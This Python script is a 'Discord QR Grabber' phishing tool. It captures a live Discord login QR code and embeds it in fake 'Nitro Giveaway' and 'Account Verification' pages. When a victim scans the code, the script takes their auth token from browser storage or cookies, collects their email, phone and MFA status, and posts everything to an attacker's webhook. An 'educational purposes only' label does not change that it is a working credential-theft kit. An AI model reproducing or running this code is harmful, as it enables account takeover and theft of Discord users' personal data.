import requests
import json
import time
import random
import string
import threading
import base64
import re
import os
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from colorama import Fore, Style, init
import websocket
from PIL import Image
import io

init()

def rgb(r, g, b):
    return f'\033[38;2;{r};{g};{b}m'

RESET = '\033[0m'

def pretty_print(text, color=(255,64,64)):
    ansi = rgb(*color)
    print(ansi + text + RESET)

def center(text):
    try:
        import shutil
        width = shutil.get_terminal_size().columns
    except Exception:
        width = 80
    if len(text) >= width:
        return text
    padding = (width - len(text)) // 2
    return " " * max(0, padding) + text

class DiscordQRGrabber:
    def __init__(self, webhook_url=None):
        self.webhook_url = webhook_url
        self.driver = None
        self.qr_token = None
        self.ws = None
        self.heartbeat_interval = None
        self.session = requests.Session()
        self.captured_token = None
        self.user_info = None
        
    def setup_browser(self, headless=False):
        try:
            chrome_options = Options()
            if headless:
                chrome_options.add_argument("--headless")
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--disable-gpu")
            chrome_options.add_argument("--window-size=1920,1080")
            chrome_options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
            
            service = Service(ChromeDriverManager().install())
            self.driver = webdriver.Chrome(service=service, options=chrome_options)
            
            pretty_print("Browser session started successfully", (0,255,0))
            return True
            
        except Exception as e:
            pretty_print(f"Failed to setup browser: {str(e)}", (255,0,0))
            return False
    
    def extract_qr_code(self):
        try:
            pretty_print("Navigating to Discord login page...", (255,255,0))
            self.driver.get("https://discord.com/login")
            
            time.sleep(3)
            
            qr_button = WebDriverWait(self.driver, 10).until(
                EC.element_to_be_clickable((By.XPATH, "//div[contains(@class, 'qrLogin')]"))
            )
            qr_button.click()
            
            pretty_print("QR Code login activated", (0,255,0))
            time.sleep(2)
            
            qr_container = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.CLASS_NAME, "qrCodeContainer_e16417"))
            )
            
            svg_element = qr_container.find_element(By.TAG_NAME, "svg")
            svg_content = svg_element.get_attribute("outerHTML")
            
            pretty_print("QR Code SVG extracted successfully", (0,255,0))
            
            self.extract_qr_token_from_page()
            
            return svg_content
            
        except Exception as e:
            pretty_print(f"Failed to extract QR code: {str(e)}", (255,0,0))
            return None
    
    def extract_qr_token_from_page(self):
        try:
            scripts = self.driver.find_elements(By.TAG_NAME, "script")
            
            for script in scripts:
                script_content = script.get_attribute("innerHTML")
                if script_content and "qr" in script_content.lower():
                    
                    token_match = re.search(r'"([a-zA-Z0-9_-]{20,})"', script_content)
                    if token_match:
                        self.qr_token = token_match.group(1)
                        pretty_print(f"QR Token extracted: {self.qr_token[:20]}...", (0,255,128))
                        return
            
            page_source = self.driver.page_source
            token_patterns = [
                r'qr["\']?\s*:\s*["\']([a-zA-Z0-9_-]{20,})["\']',
                r'token["\']?\s*:\s*["\']([a-zA-Z0-9_-]{20,})["\']',
                r'"([a-zA-Z0-9_-]{24})"'
            ]
            
            for pattern in token_patterns:
                matches = re.findall(pattern, page_source)
                if matches:
                    self.qr_token = matches[0]
                    pretty_print(f"QR Token found via pattern: {self.qr_token[:20]}...", (0,255,128))
                    return
                    
            pretty_print("QR Token extraction failed, using fallback method", (255,255,0))
            self.qr_token = f"qr_fallback_{int(time.time())}"
            
        except Exception as e:
            pretty_print(f"Error extracting QR token: {str(e)}", (255,0,0))
            self.qr_token = f"qr_error_{int(time.time())}"
    
    def save_qr_code(self, svg_content, custom_name=None):
        try:
            if not custom_name:
                custom_name = f"discord_qr_{int(time.time())}"
            
            files_created = []
            
            # Windows-kompatible Methode: Screenshot vom Browser
            try:
                qr_element = self.driver.find_element(By.CLASS_NAME, "qrCodeContainer_e16417")
                screenshot_path = f"{custom_name}_screenshot.png"
                qr_element.screenshot(screenshot_path)
                files_created.append(screenshot_path)
                pretty_print(f"QR Code Screenshot gespeichert: {screenshot_path}", (0,255,128))
            except Exception as e:
                pretty_print(f"Screenshot-Methode fehlgeschlagen: {str(e)}", (255,255,0))
                # Fallback: Vollbild-Screenshot
                try:
                    full_screenshot_path = f"{custom_name}_fullscreen.png"
                    self.driver.save_screenshot(full_screenshot_path)
                    files_created.append(full_screenshot_path)
                    pretty_print(f"Vollbild-Screenshot erstellt: {full_screenshot_path}", (0,255,128))
                except Exception as e2:
                    pretty_print(f"Auch Vollbild-Screenshot fehlgeschlagen: {str(e2)}", (255,0,0))
            
            # HTML-Datei mit eingebettetem SVG erstellen
            try:
                import base64
                svg_b64 = base64.b64encode(svg_content.encode('utf-8')).decode('utf-8')
                
                html_variants = [
                    {
                        "name": "clean",
                        "title": "Discord QR Code",
                        "style": "background:#ffffff;padding:30px;border-radius:15px;box-shadow:0 4px 20px rgba(0,0,0,0.1);"
                    },
                    {
                        "name": "giveaway",
                        "title": "🎉 Discord Nitro Giveaway 🎉",
                        "style": "background:linear-gradient(135deg,#7289da,#99aab5);padding:40px;border-radius:20px;color:white;box-shadow:0 8px 32px rgba(0,0,0,0.3);"
                    },
                    {
                        "name": "premium",
                        "title": "⭐ Premium Discord Access ⭐",
                        "style": "background:linear-gradient(135deg,#ffd700,#ffed4e);padding:35px;border-radius:18px;color:#333;box-shadow:0 6px 25px rgba(255,215,0,0.4);"
                    }
                ]
                
                for variant in html_variants:
                    html_content = f"""
<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{variant['title']}</title>
    <style>
        body {{
            margin: 0;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }}
        .container {{
            text-align: center;
            {variant['style']}
            max-width: 400px;
        }}
        .qr-code {{
            width: 250px;
            height: 250px;
            margin: 20px auto;
            border: 3px solid rgba(255,255,255,0.2);
            border-radius: 10px;
            padding: 10px;
            background: white;
        }}
        .title {{
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 15px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }}
        .subtitle {{
            font-size: 16px;
            opacity: 0.9;
            margin-bottom: 20px;
        }}
        .instructions {{
            font-size: 14px;
            opacity: 0.8;
            margin-top: 20px;
            line-height: 1.4;
        }}
        .warning {{
            background: rgba(255,0,0,0.1);
            border: 1px solid rgba(255,0,0,0.3);
            border-radius: 8px;
            padding: 10px;
            margin-top: 15px;
            font-size: 12px;
            color: #ff4444;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="title">{variant['title']}</div>
        <div class="subtitle">Scanne den QR Code mit der Discord App</div>
        <div class="qr-code">
            <img src="data:image/svg+xml;base64,{svg_b64}" style="width:100%;height:100%;">
        </div>
        <div class="instructions">
            📱 Öffne Discord auf deinem Handy<br>
            ⚙️ Gehe zu Einstellungen<br>
            📷 Wähle "QR Code scannen"<br>
            🎯 Scanne diesen Code
        </div>
        <div class="warning">
            ⚠️ Nur für autorisierte Benutzer
        </div>
    </div>
</body>
</html>
                    """
                    
                    html_filename = f"{custom_name}_{variant['name']}.html"
                    with open(html_filename, 'w', encoding='utf-8') as f:
                        f.write(html_content)
                    
                    files_created.append(html_filename)
                    pretty_print(f"HTML-Variante erstellt: {html_filename}", (0,255,128))
                
            except Exception as e:
                pretty_print(f"HTML-Erstellung fehlgeschlagen: {str(e)}", (255,0,0))
            
            # SVG-Datei direkt speichern
            try:
                svg_filename = f"{custom_name}.svg"
                with open(svg_filename, 'w', encoding='utf-8') as f:
                    f.write(svg_content)
                files_created.append(svg_filename)
                pretty_print(f"SVG-Datei gespeichert: {svg_filename}", (0,255,128))
            except Exception as e:
                pretty_print(f"SVG-Speicherung fehlgeschlagen: {str(e)}", (255,0,0))
            
            if files_created:
                pretty_print(f"Insgesamt {len(files_created)} Dateien erstellt", (0,255,0))
            else:
                pretty_print("Keine Dateien konnten erstellt werden", (255,0,0))
                
            return files_created
                
        except Exception as e:
            pretty_print(f"Fehler beim Speichern des QR Codes: {str(e)}", (255,0,0))
            return []
    
    def setup_websocket_listener(self):
        try:
            def on_message(ws, message):
                try:
                    data = json.loads(message)
                    
                    if data.get('t') == 'READY':
                        user_data = data.get('d', {}).get('user', {})
                        if user_data:
                            self.captured_token = data.get('d', {}).get('session_id', 'unknown')
                            self.user_info = user_data
                            pretty_print("Discord token captured!", (0,255,0))
                            self.send_captured_data()
                    
                    elif data.get('op') == 10:
                        self.heartbeat_interval = data.get('d', {}).get('heartbeat_interval', 41250)
                        self.start_heartbeat()
                        
                except Exception as e:
                    pretty_print(f"WebSocket message error: {str(e)}", (255,0,0))
            
            def on_error(ws, error):
                pretty_print(f"WebSocket error: {str(error)}", (255,0,0))
            
            def on_close(ws, close_status_code, close_msg):
                pretty_print("WebSocket connection closed", (255,255,0))
            
            def on_open(ws):
                pretty_print("WebSocket connection established", (0,255,0))
                identify_payload = {
                    "op": 2,
                    "d": {
                        "token": None,
                        "properties": {
                            "$os": "Windows",
                            "$browser": "Chrome",
                            "$device": "desktop"
                        }
                    }
                }
                ws.send(json.dumps(identify_payload))
            
            self.ws = websocket.WebSocketApp(
                "wss://gateway.discord.gg/?v=9&encoding=json",
                on_open=on_open,
                on_message=on_message,
                on_error=on_error,
                on_close=on_close
            )
            
            return True
            
        except Exception as e:
            pretty_print(f"Failed to setup WebSocket: {str(e)}", (255,0,0))
            return False
    
    def start_heartbeat(self):
        def heartbeat():
            while self.ws and not self.ws.sock.closed:
                try:
                    heartbeat_payload = {"op": 1, "d": None}
                    self.ws.send(json.dumps(heartbeat_payload))
                    time.sleep(self.heartbeat_interval / 1000)
                except:
                    break
        
        threading.Thread(target=heartbeat, daemon=True).start()
    
    def monitor_qr_login(self, timeout=300):
        try:
            pretty_print(f"Monitoring QR code for login attempts (timeout: {timeout}s)...", (255,255,0))
            
            start_time = time.time()
            
            while time.time() - start_time < timeout:
                try:
                    if self.captured_token:
                        pretty_print("Login detected via WebSocket!", (0,255,0))
                        return True
                    
                    page_source = self.driver.page_source
                    
                    if "Welcome back!" in page_source or "dashboard" in self.driver.current_url:
                        pretty_print("Login detected via page change!", (0,255,0))
                        self.extract_token_from_browser()
                        return True
                    
                    if "QR code expired" in page_source or "expired" in page_source.lower():
                        pretty_print("QR code expired, refreshing...", (255,255,0))
                        self.driver.refresh()
                        time.sleep(3)
                        self.extract_qr_code()
                    
                    time.sleep(2)
                    
                except Exception as e:
                    pretty_print(f"Monitor error: {str(e)}", (255,0,0))
                    time.sleep(2)
            
            pretty_print("QR code monitoring timeout reached", (255,0,0))
            return False
            
        except Exception as e:
            pretty_print(f"Failed to monitor QR login: {str(e)}", (255,0,0))
            return False
    
    def extract_token_from_browser(self):
        try:
            local_storage = self.driver.execute_script("return window.localStorage;")
            session_storage = self.driver.execute_script("return window.sessionStorage;")
            
            for storage in [local_storage, session_storage]:
                if storage:
                    for key, value in storage.items():
                        if "token" in key.lower() and len(value) > 20:
                            self.captured_token = value.strip('"')
                            pretty_print(f"Token extracted from browser storage: {self.captured_token[:20]}...", (0,255,0))
                            break
            
            if not self.captured_token:
                cookies = self.driver.get_cookies()
                for cookie in cookies:
                    if "token" in cookie.get('name', '').lower():
                        self.captured_token = cookie.get('value', '')
                        pretty_print(f"Token extracted from cookies: {self.captured_token[:20]}...", (0,255,0))
                        break
            
            if self.captured_token:
                self.get_user_info()
                
        except Exception as e:
            pretty_print(f"Failed to extract token from browser: {str(e)}", (255,0,0))
    
    def get_user_info(self):
        try:
            if not self.captured_token:
                return
            
            headers = {
                'Authorization': self.captured_token,
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            response = self.session.get('https://discord.com/api/v9/users/@me', headers=headers)
            
            if response.status_code == 200:
                self.user_info = response.json()
                pretty_print(f"User info retrieved: {self.user_info.get('username', 'Unknown')}#{self.user_info.get('discriminator', '0000')}", (0,255,0))
            else:
                pretty_print(f"Failed to get user info: {response.status_code}", (255,0,0))
                
        except Exception as e:
            pretty_print(f"Error getting user info: {str(e)}", (255,0,0))
    
    def send_captured_data(self):
        try:
            if not self.webhook_url:
                pretty_print("No webhook configured, skipping data send", (255,255,0))
                return
            
            if not self.captured_token or not self.user_info:
                pretty_print("No token or user info to send", (255,0,0))
                return
            
            embed = {
                "embeds": [{
                    "title": "Discord QR Code Login Captured",
                    "description": "A user has logged in via QR code",
                    "color": 0x00ff00,
                    "fields": [
                        {
                            "name": "Username",
                            "value": f"{self.user_info.get('username', 'Unknown')}#{self.user_info.get('discriminator', '0000')}",
                            "inline": True
                        },
                        {
                            "name": "User ID",
                            "value": str(self.user_info.get('id', 'Unknown')),
                            "inline": True
                        },
                        {
                            "name": "Email",
                            "value": self.user_info.get('email', 'Not available'),
                            "inline": True
                        },
                        {
                            "name": "Phone",
                            "value": self.user_info.get('phone', 'Not available'),
                            "inline": True
                        },
                        {
                            "name": "Verified",
                            "value": str(self.user_info.get('verified', False)),
                            "inline": True
                        },
                        {
                            "name": "MFA Enabled",
                            "value": str(self.user_info.get('mfa_enabled', False)),
                            "inline": True
                        },
                        {
                            "name": "Token",
                            "value": f"```{self.captured_token}```",
                            "inline": False
                        }
                    ],
                    "thumbnail": {
                        "url": f"https://cdn.discordapp.com/avatars/{self.user_info.get('id')}/{self.user_info.get('avatar')}.png" if self.user_info.get('avatar') else "https://cdn.discordapp.com/embed/avatars/0.png"
                    },
                    "footer": {
                        "text": "Discord QR Grabber - Educational purposes only"
                    },
                    "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
                }]
            }
            
            response = self.session.post(self.webhook_url, json=embed)
            
            if response.status_code in [200, 204]:
                pretty_print("Captured data sent to webhook successfully!", (0,255,0))
            else:
                pretty_print(f"Failed to send data to webhook: {response.status_code}", (255,0,0))
                
        except Exception as e:
            pretty_print(f"Error sending captured data: {str(e)}", (255,0,0))
    
    def create_custom_qr_page(self, qr_svg, custom_title="Discord Nitro Giveaway"):
        try:
            html_template = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{custom_title}</title>
    <style>
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }}
        .container {{
            background: white;
            border-radius: 15px;
            padding: 40px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 500px;
            width: 100%;
        }}
        .title {{
            color: #5865F2;
            font-size: 28px;
            font-weight: bold;
            margin-bottom: 10px;
        }}
        .subtitle {{
            color: #666;
            font-size: 16px;
            margin-bottom: 30px;
        }}
        .qr-container {{
            background: #f8f9fa;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
            display: inline-block;
        }}
        .instructions {{
            color: #333;
            font-size: 14px;
            line-height: 1.6;
            margin-top: 20px;
        }}
        .warning {{
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 5px;
            padding: 10px;
            margin-top: 15px;
            font-size: 12px;
            color: #856404;
        }}
        .discord-logo {{
            width: 40px;
            height: 40px;
            margin-bottom: 20px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <svg class="discord-logo" viewBox="0 0 71 55" fill="#5865F2">
            <path d="M60.1045 4.8978C55.5792 2.8214 50.7265 1.2916 45.6527 0.41542C45.5603 0.39851 45.468 0.440769 45.4204 0.525289C44.7963 1.6353 44.105 3.0834 43.6209 4.2216C38.1637 3.4046 32.7345 3.4046 27.3892 4.2216C26.905 3.0581 26.1886 1.6353 25.5617 0.525289C25.5141 0.443589 25.4218 0.40133 25.3294 0.41542C20.2584 1.2888 15.4057 2.8186 10.8776 4.8978C10.8384 4.9147 10.8048 4.9429 10.7825 4.9795C1.57795 18.7309 -0.943561 32.1443 0.293408 45.3914C0.299005 45.4562 0.335386 45.5182 0.385761 45.5576C6.45866 50.0174 12.3413 52.7249 18.1147 54.5195C18.2071 54.5477 18.305 54.5139 18.3638 54.4378C19.7295 52.5728 20.9469 50.6063 21.9907 48.5383C22.0523 48.4172 21.9935 48.2735 21.8676 48.2256C19.9366 47.4931 18.0979 46.6 16.3292 45.5858C16.1893 45.5041 16.1781 45.304 16.3068 45.2082C16.679 44.9293 17.0513 44.6391 17.4067 44.3461C17.471 44.2926 17.5606 44.2813 17.6362 44.3151C29.2558 49.6202 41.8354 49.6202 53.3179 44.3151C53.3935 44.2785 53.4831 44.2898 53.5502 44.3433C53.9057 44.6363 54.2779 44.9293 54.6529 45.2082C54.7816 45.304 54.7732 45.5041 54.6333 45.5858C52.8646 46.6197 51.0259 47.4931 49.0921 48.2228C48.9662 48.2707 48.9102 48.4172 48.9718 48.5383C50.038 50.6034 51.2554 52.5699 52.5959 54.435C52.6519 54.5139 52.7526 54.5477 52.845 54.5195C58.6464 52.7249 64.529 50.0174 70.6019 45.5576C70.6551 45.5182 70.6887 45.459 70.6943 45.3942C72.1747 30.0791 68.2147 16.7757 60.1968 4.9823C60.1772 4.9429 60.1437 4.9147 60.1045 4.8978ZM23.7259 37.3253C20.2276 37.3253 17.3451 34.1136 17.3451 30.1693C17.3451 26.225 20.1717 23.0133 23.7259 23.0133C27.308 23.0133 30.1626 26.2532 30.1066 30.1693C30.1066 34.1136 27.28 37.3253 23.7259 37.3253ZM47.3178 37.3253C43.8196 37.3253 40.9371 34.1136 40.9371 30.1693C40.9371 26.225 43.7636 23.0133 47.3178 23.0133C50.9 23.0133 53.7545 26.2532 53.6986 30.1693C53.6986 34.1136 50.9 37.3253 47.3178 37.3253Z"/>
        </svg>
        
        <div class="title">{custom_title}</div>
        <div class="subtitle">Scan the QR code with your Discord mobile app to verify your account</div>
        
        <div class="qr-container">
            {qr_svg}
        </div>
        
        <div class="instructions">
            <strong>How to scan:</strong><br>
            1. Open Discord on your mobile device<br>
            2. Go to Settings → Scan QR Code<br>
            3. Point your camera at the QR code above<br>
            4. Confirm the login on your mobile device
        </div>
        
        <div class="warning">
            This QR code will expire in 5 minutes for security reasons.
        </div>
    </div>
</body>
</html>
"""
            
            filename = f"custom_qr_{custom_title.lower().replace(' ', '_')}_{int(time.time())}.html"
            
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(html_template)
            
            pretty_print(f"Custom QR page created: {filename}", (0,255,0))
            return filename
            
        except Exception as e:
            pretty_print(f"Failed to create custom QR page: {str(e)}", (255,0,0))
            return None
    
    def cleanup(self):
        try:
            if self.ws:
                self.ws.close()
            if self.driver:
                self.driver.quit()
            pretty_print("Cleanup completed", (0,255,128))
        except Exception as e:
            pretty_print(f"Cleanup error: {str(e)}", (255,0,0))

def run_discord_qr_grabber():
    os.system('cls' if os.name == 'nt' else 'clear')
    
    pretty_print("DISCORD QR CODE GRABBER", (255,0,0))
    pretty_print("Extracts real Discord QR codes and captures login tokens", (255,64,64))
    pretty_print("=" * 60, (255,64,64))
    print()
    
    webhook_url = input(rgb(255,32,32) + center("Discord Webhook URL (optional): ") + RESET)
    if webhook_url and not webhook_url.strip():
        webhook_url = None
    
    grabber = DiscordQRGrabber(webhook_url)
    
    try:
        while True:
            print()
            pretty_print("DISCORD QR GRABBER OPTIONS:", (255,128,0))
            print(rgb(150,255,150) + center("1. Extract Discord QR Code (Headless)") + RESET)
            print(rgb(150,255,150) + center("2. Extract Discord QR Code (Visible Browser)") + RESET)
            print(rgb(255,255,150) + center("3. Create Custom Giveaway QR Page") + RESET)
            print(rgb(255,255,150) + center("4. Create Custom Verification QR Page") + RESET)
            print(rgb(255,100,100) + center("5. Full QR Capture + Monitor Session") + RESET)
            print(rgb(255,64,64) + center("0. Back to Main Menu") + RESET)
            print()
            
            choice = input(rgb(255,32,32) + center("Choose option (0-5): ") + RESET).strip()
            
            if choice == "0":
                break
                
            elif choice in ["1", "2"]:
                headless = choice == "1"
                
                if not grabber.setup_browser(headless):
                    continue
                
                svg_content = grabber.extract_qr_code()
                
                if svg_content:
                    custom_name = input(rgb(255,32,32) + "Custom filename (optional): " + RESET).strip()
                    if not custom_name:
                        custom_name = None
                    
                    png_files = grabber.save_qr_code(svg_content, custom_name)
                    
                    if webhook_url and png_files:
                        try:
                            for png_file in png_files:
                                with open(png_file, 'rb') as f:
                                    files = {'file': (png_file, f, 'image/png')}
                                    payload = {
                                        'content': f"**Discord QR Code Extracted**\nFile: `{png_file}`\nExtracted: {time.strftime('%Y-%m-%d %H:%M:%S')}"
                                    }
                                    response = grabber.session.post(webhook_url, data=payload, files=files)
                                    if response.status_code in [200, 204]:
                                        pretty_print(f"QR code {png_file} sent to webhook!", (0,255,0))
                                    time.sleep(1)
                        except Exception as e:
                            pretty_print(f"Failed to send to webhook: {str(e)}", (255,0,0))
                
                grabber.cleanup()
                
            elif choice == "3":
                if not grabber.setup_browser(True):
                    continue
                
                svg_content = grabber.extract_qr_code()
                if svg_content:
                    html_file = grabber.create_custom_qr_page(svg_content, "Discord Nitro Giveaway - Verify Account")
                    if html_file:
                        pretty_print(f"Open {html_file} in a browser to view the custom giveaway page", (0,255,128))
                
                grabber.cleanup()
                
            elif choice == "4":
                if not grabber.setup_browser(True):
                    continue
                
                svg_content = grabber.extract_qr_code()
                if svg_content:
                    html_file = grabber.create_custom_qr_page(svg_content, "Account Verification Required")
                    if html_file:
                        pretty_print(f"Open {html_file} in a browser to view the custom verification page", (0,255,128))
                
                grabber.cleanup()
                
            elif choice == "5":
                headless_choice = input(rgb(255,32,32) + "Run in headless mode? (y/n): " + RESET).strip().lower()
                headless = headless_choice == 'y'
                
                if not grabber.setup_browser(headless):
                    continue
                
                svg_content = grabber.extract_qr_code()
                
                if svg_content:
                    custom_name = input(rgb(255,32,32) + "Custom filename (optional): " + RESET).strip()
                    if not custom_name:
                        custom_name = f"discord_qr_session_{int(time.time())}"
                    
                    png_files = grabber.save_qr_code(svg_content, custom_name)
                    
                    timeout_input = input(rgb(255,32,32) + "Monitor timeout in seconds (default 300): " + RESET).strip()
                    try:
                        timeout = int(timeout_input) if timeout_input else 300
                    except ValueError:
                        timeout = 300
                    
                    pretty_print(f"Starting QR code monitoring for {timeout} seconds...", (255,255,0))
                    pretty_print("Scan the QR code with Discord mobile app now!", (0,255,255))
                    
                    if grabber.monitor_qr_login(timeout):
                        pretty_print("Login successful! Token captured.", (0,255,0))
                        if grabber.captured_token:
                            pretty_print(f"Token: {grabber.captured_token[:50]}...", (0,255,128))
                        if grabber.user_info:
                            username = grabber.user_info.get('username', 'Unknown')
                            discriminator = grabber.user_info.get('discriminator', '0000')
                            pretty_print(f"User: {username}#{discriminator}", (0,255,128))
                    else:
                        pretty_print("No login detected within timeout period", (255,255,0))
                
                grabber.cleanup()
            
            else:
                pretty_print("Invalid option!", (255,0,0))
            
            print()
            input(rgb(255,32,32) + center("Press Enter to continue...") + RESET)
    
    except KeyboardInterrupt:
        pretty_print("Operation cancelled by user", (255,255,0))
    except Exception as e:
        pretty_print(f"Unexpected error: {str(e)}", (255,0,0))
    finally:
        grabber.cleanup()

if __name__ == "__main__":
    run_discord_qr_grabber()